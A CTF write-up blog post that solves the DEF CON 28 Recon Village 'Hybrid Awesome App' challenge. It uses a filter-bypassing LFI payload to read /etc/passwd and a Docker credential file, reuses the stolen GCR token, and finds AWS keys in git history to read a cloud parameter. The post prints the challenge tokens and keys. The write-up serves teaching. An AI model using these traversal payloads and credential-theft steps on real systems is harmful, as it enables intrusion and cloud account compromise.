---
layout: post
title: 'Recon Village CTF @ DC28 - Hybrid Awesome App Challenge'
date: '2020-08-10T00:00:00.000-00:00'
author: Keramas
tags: [ctf, defcon28, defconsafemode, reconvillage]
---

With so much content this year for Defcon 28, I placed all my focus on the Red Team Village CTF, but my teammate Altezza spent some time looking at the Recon Village CTF during some downtime on Friday and hit me up for some help with an interesting web/cloud challenge.

<img src = "/assets/images/reconvillagedc28/hybridawesomeapp.png">

The application is quite bare, and inputting anything into the box appears to do nothing, but we can see the following parameter which just smells like LFI.

```
http://159.65.106.65/index.php?file=test
```

Inspecting the source code reveals a couple of clues--namely that this application is based on a Docker image hosted on Gcloud.

```html
    <center>
        <h1>Hybrid Awesome App</h1>
        <!-- Built with love using Docker -->
        <form action="/index.php" method="GET">
            <input type="text" name="file">
        </form>

            </center>
    </body>
</html>

[SNIP]
<!-- Golden docker image hosted in gcr.io/recon-285218/recon-code -->
```

After messing around with the file parameter, it was indeed susceptible to LFI through a simple WAF/validation bypass:

```
http://159.65.106.65/index.php?file=..././..././..././..././..././..././etc/passwd
```

<img src = "/assets/images/reconvillagedc28/lfi.png">

Based on the clues in the source code, since it is not possible to retrieve the golden Docker image without authentication, it is a good bet that the LFI is the way to get this data. 

A good clue is also present on the /info.php page:

<img src = "/assets/images/reconvillagedc28/rtfm.png">

This is definitely a hint to read about GCR Docker authentication, which points to the fact that the authentication key should be in `.docker/config.json`. Looking at the `/etc/passwd` entry, we have the Automator user which is used for Ansible, GCR, and other things, so their home directory is a good candidate. Using the LFI to test this out, it was possible to retrieve the auth file.

```
http://159.65.106.65/index.php?file=..././..././..././..././..././..././home/automator/.docker/config.json
```

<img src = "/assets/images/reconvillagedc28/gcloud.png">

Now that the config.json is in our possession, it is possible to authenticate to Gcloud:

```
# gcloud auth activate-service-account --key-file config.json
Activated service account credentials for: [recon-container@recon-285218.iam.gserviceaccount.com]
```

You can then print out the token, and pass it to Docker in order to login.

```
# gcloud auth print-access-token
ya29.c.KpYB1wcWhYrCYdx32EhocOMjGFl37QzHAwsaTblYBN6IKBuuD06g7uZMf2ZZKC4q1mFBaK5NZEUlNCa4hmN4znB4UD3nk2nJbcmQwMta7mtot_F26gH1h0OYr4Gp2_9tuO4FjsJzkHWVjmkB4hjcyKZ7PvXtH1SllKRCE43gQXofzGwVGnyI1FrmO3kVAntpndVgxODMk8mO
```

```
# docker login -u oauth2accesstoken -p "ya29.c.KpYB1wcWhYrCYdx32EhocOMjGFl37QzHAwsaTblYBN6IKBuuD06g7uZMf2ZZKC4q1mFBaK5NZEUlNCa4hmN4znB4UD3nk2nJbcmQwMta7mtot_F26gH1h0OYr4Gp2_9tuO4FjsJzkHWVjmkB4hjcyKZ7PvXtH1SllKRCE43gQXofzGwVGnyI1FrmO3kVAntpndVgxODMk8mO" https://gcr.io/recon-285218/recon-code
```

Now that we are authenticated, the Docker image can be pulled:

```
docker pull recon-285218/recon-code
```

Hopping into the image with `docker run -it <image> sh`, there was an `app` folder containing a git repo.

Using `git log` we can see the change history which mentions env variables, which can contain keys for AWS or other key data.

```
commit 645228975ee876d1ca451e1876967648fffb5157 (HEAD -> master)
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Sun Aug 2 20:25:27 2020 +0200

    Final code release

commit d8d2254968636cc74bf6b0eb55c08db1d9586e1c
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Sun Aug 2 20:24:46 2020 +0200

    updated the codebase

commit 2db6437f13ad2a547fb4e25b4982b3e14ecc08a6
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Sun Aug 2 20:24:04 2020 +0200

    Added env variables

commit 0ebc9223e6d406d79870988fae77b2c7f0f5a856
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Sun Aug 2 20:23:08 2020 +0200

    Added docs

commit b2bfab33a39900021900b0c59e760918bc00ded2
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Sun Aug 2 20:23:00 2020 +0200

    Added the main code
```
Using `git diff` on the commit for the variables (2db6437f13ad2a547fb4e25b4982b3e14ecc08a6), we get a pair of AWS credentials.

```
diff --git a/.env b/.env
deleted file mode 100644
index f8b4175..0000000
--- a/.env
+++ /dev/null
@@ -1,3 +0,0 @@
-[default]
-aws_access_key_id = AKIAXMXLEAVVDDJAANDD
-aws_secret_access_key = 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
diff --git a/README.md b/README.md
index 3d7addf..0f47c02 100644
--- a/README.md
+++ b/README.md
@@ -1,3 +1,9 @@
 # Ubercool Service
 
 This is an ubercool service. Written in Golang!
```

Now taking these keys and using it with aws-cli tools, we can query AWS to determine what these credentials are for.

```json
# aws sts get-caller-identity
{
    "UserId": "AIDAXMXLEAVVNPZ2QUKVR",
    "Account": "508372977002",
    "Arn": "arn:aws:iam::508372977002:user/read-param"
}
```

Looking at the "read-param" username, it's a good bet that this key pair had some kind of read privileges for parameters in AWS SSM. Taking a look at the parameters present reveals  "/prod/ctf/flag".

```json
# aws ssm describe-parameters --region us-east-1
{
    "Parameters": [
        {
            "Name": "/prod/ctf/flag",
            "Type": "String",
            "LastModifiedDate": 1596816202.755,
            "LastModifiedUser": "arn:aws:iam::508372977002:user/madhuakula",
            "Version": 3,
            "Tier": "Standard",
            "Policies": [],
            "DataType": "text"
        }
    ]
}
```
A final query can then be made to read the parameter, which at long last gives the flag!

```json
# aws ssm get-parameters --name /prod/ctf/flag --region us-east-1
{
    "Parameters": [
        {
            "Name": "/prod/ctf/flag",
            "Type": "String",
            "Value": "ZmxhZzp7ZGU1MzE1NmIyYWEwNzQwNmEwMjZkODQxNThlMzI2N2F9",
            "Version": 3,
            "LastModifiedDate": 1596816202.755,
            "ARN": "arn:aws:ssm:us-east-1:508372977002:parameter/prod/ctf/flag",
            "DataType": "text"
        }
    ],
    "InvalidParameters": []
}
```

```
echo ZmxhZzp7ZGU1MzE1NmIyYWEwNzQwNmEwMjZkODQxNThlMzI2N2F9 | base64 -d
flag:{de53156b2aa07406a026d84158e3267a}
```



